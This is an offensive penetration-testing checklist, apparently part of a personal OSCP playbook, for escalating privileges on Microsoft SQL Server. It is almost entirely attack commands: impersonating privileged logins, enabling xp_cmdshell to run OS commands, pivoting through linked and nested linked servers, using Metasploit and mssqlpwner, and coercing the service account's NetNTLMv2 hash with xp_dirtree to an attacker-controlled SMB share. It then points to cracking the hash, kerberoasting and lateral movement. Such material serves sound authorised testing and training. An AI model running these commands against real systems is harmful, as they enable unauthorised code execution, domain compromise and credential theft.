# MSSQL impersonation and links

## Before I start
- [ ] Connected with whatever I have, a guest SQL login, a reused password or a domain user: :Pb mssql
At the pwn-broker prompt: tool install impacket.
impacket-mssqlclient '<Domain>/<Username>:<Password>@<TargetIP>' -windows-auth

## Who I can impersonate
SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
- [ ] sa or another privileged login in the list: impersonated directly, as <TargetUser>
- [ ] Nobody listed: the links first, with this check run again on each one

## Become them
EXECUTE AS LOGIN = '<TargetUser>';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
- [ ] The commands run as the SQL service account: its rights in the domain checked, since they are rarely small
- [ ] Metasploit does it too: auxiliary/admin/mssql/mssql_escalate_execute_as, and mssql_escalate_dbowner for a db_owner
- [ ] OSCP one-target limit: this Metasploit auxiliary module spends my one target, even if it fails

## Links: what this server trusts
EXEC sp_linkedservers;
SELECT * FROM master..sysservers;
With THE-LINKED-SERVER a name from that list:
SELECT * FROM OPENQUERY([THE-LINKED-SERVER], 'SELECT SYSTEM_USER');
- [ ] The link's login on the far side often has more rights than mine here: that is the escalation
- [ ] The whole chain mapped from a Windows host with PowerUpSQL, https://github.com/NetSPI/PowerUpSQL: Get-SQLServerLinkCrawl -Instance <TargetIP> -Verbose

## Commands through a link
EXECUTE('sp_configure ''show advanced options'',1; reconfigure;') AT [THE-LINKED-SERVER];
EXECUTE('sp_configure ''xp_cmdshell'',1; reconfigure;') AT [THE-LINKED-SERVER];
EXECUTE('exec master..xp_cmdshell ''whoami''') AT [THE-LINKED-SERVER];
- [ ] OPENQUERY cannot run a procedure, so EXECUTE(...) AT is the form, and each level of nesting doubles the single quotes
- [ ] A second hop, through THE-LINKED-SERVER to THE-SECOND-LINK: SELECT * FROM OPENQUERY([THE-LINKED-SERVER], 'SELECT * FROM OPENQUERY([THE-SECOND-LINK], ''exec xp_cmdshell ''''whoami'''''')');

## From Kali, with mssqlpwner
mssqlpwner, after sudo apt install -y mssqlpwner:
mssqlpwner '<Domain>/<Username>:<Password>@<TargetIP>' -windows-auth -max-impersonation-depth 2 interactive
mssqlpwner '<Domain>/<Username>:<Password>@<TargetIP>' -windows-auth -link-name THE-LINKED-SERVER exec hostname
- [ ] In interactive: get-chain-list shows each route through links and impersonation, and set-chain or set-link-server picks one

## The service account's hash
The non-poisoning SMB listener from :Pb responder:
sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support
EXEC master..xp_dirtree '\\<LHOST>\share';
- [ ] The listener prints the service account's NetNTLMv2 response, to crack: :Pb responder
- [ ] Not on the OSCP exam: relaying a captured response is kept out as a safe reading; OffSec's pages do not name relay

## Next
- [ ] The service account's password or hash tried across the domain: :Pb lateral-movement
- [ ] The service account has an SPN, since it runs MSSQL: roasted for its password, :Pb kerberoasting
